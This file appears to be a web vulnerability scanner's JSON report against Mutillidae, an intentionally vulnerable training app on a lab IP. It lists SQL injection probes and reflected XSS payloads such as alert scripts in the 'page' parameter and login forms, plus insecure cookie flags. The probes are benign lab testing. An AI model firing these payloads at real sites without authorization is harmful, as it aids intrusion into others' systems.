@@ -1,0 +1,132 @@
+{
+    "vulnerabilities": [
+        {
+            "vuln_type": "Injection SQL",
+            "type": "FORM",
+            "url": "http://10.129.145.120/mutillidae/index.php?page=login.php",
+            "param": "Multiple/Form",
+            "payload": "'e"
+        },
+        {
+            "vuln_type": "XSS",
+            "type": "FORM",
+            "url": "http://10.129.145.120/mutillidae/index.php?page=login.php",
+            "param": "Multiple/Form",
+            "payload": "<script>alert('XSS')</script>"
+        },
+        {
+            "vuln_type": "XSS",
+            "type": "URL",
+            "url": "http://10.129.145.120/mutillidae/index.php?do=toggle-security&page=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+            "param": "page",
+            "payload": "\"><script>alert(1)</script>"
+        },
+        {
+            "vuln_type": "XSS",
+            "type": "URL",
+            "url": "http://10.129.145.120/mutillidae/index.php?do=toggle-security&page=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
+            "param": "page",
+            "payload": "<script>alert('XSS')</script>"
+        },
+        {
+            "vuln_type": "XSS",
+            "type": "URL",
+            "url": "http://10.129.145.120/mutillidae/index.php?page=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
+            "param": "page",
+            "payload": "<script>alert('XSS')</script>"
+        },
+        {
+            "vuln_type": "XSS",
+            "type": "URL",
+            "url": "http://10.129.145.120/mutillidae/index.php?do=toggle-security&page=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
+            "param": "page",
+            "payload": "<script>alert('XSS')</script>"
+        },
+        {
+            "vuln_type": "XSS",
+            "type": "URL",
+            "url": "http://10.129.145.120/mutillidae/index.php?do=toggle-hints&page=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
+            "param": "page",
+            "payload": "<script>alert('XSS')</script>"
+        },
+        {
+            "vuln_type": "XSS",
+            "type": "URL",
+            "url": "http://10.129.145.120/mutillidae/index.php?page=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
+            "param": "page",
+            "payload": "<script>alert('XSS')</script>"
+        },
+        {
+            "vuln_type": "XSS",
+            "type": "URL",
+            "url": "http://10.129.145.120/mutillidae/index.php?do=toggle-hints&page=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
+            "param": "page",
+            "payload": "<script>alert('XSS')</script>"
+        },
+        {
+            "vuln_type": "XSS",
+            "type": "URL",
+            "url": "http://10.129.145.120/mutillidae/index.php?do=toggle-security&page=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
+            "param": "page",
+            "payload": "<script>alert('XSS')</script>"
+        },
+        {
+            "vuln_type": "XSS",
+            "type": "URL",
+            "url": "http://10.129.145.120/mutillidae/index.php?page=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
+            "param": "page",
+            "payload": "<script>alert('XSS')</script>"
+        },
+        {
+            "vuln_type": "XSS",
+            "type": "URL",
+            "url": "http://10.129.145.120/mutillidae/index.php?do=toggle-security&page=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
+            "param": "page",
+            "payload": "<script>alert('XSS')</script>"
+        },
+        {
+            "vuln_type": "Injection SQL",
+            "type": "FORM",
+            "url": "http://10.129.145.120/mutillidae/index.php?page=user-info.php&page=user-info.php&username=%27f&password=%27f&user-info-php-submit-button=View+Account+Details",
+            "param": "Multiple/Form",
+            "payload": "'f"
+        },
+        {
+            "vuln_type": "XSS",
+            "type": "FORM",
+            "url": "http://10.129.145.120/mutillidae/index.php?page=user-info.php",
+            "param": "Multiple/Form",
+            "payload": "<script>alert('XSS')</script>"
+        },
+        {
+            "vuln_type": "XSS",
+            "type": "URL",
+            "url": "http://10.129.145.120/mutillidae/index.php?page=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",
+            "param": "page",
+            "payload": "<script>alert('XSS')</script>"
+        },
+        {
+            "vuln_type": "Injection SQL",
+            "type": "FORM",
+            "url": "http://10.129.145.120/mutillidae/index.php?page=user-info.php&page=user-info.php&username=%27b&password=%27b&user-info-php-submit-button=View+Account+Details",
+            "param": "Multiple/Form",
+            "payload": "'b"
+        }
+    ],
+    "info": [
+        {
+            "type": "cookie",
+            "name": "PHPSESSID",
+            "domain": "10.129.145.120",
+            "secure": false,
+            "httponly": false
+        },
+        {
+            "type": "cookie",
+            "name": "showhints",
+            "domain": "10.129.145.120",
+            "secure": false,
+            "httponly": false
+        }
+    ]
+}
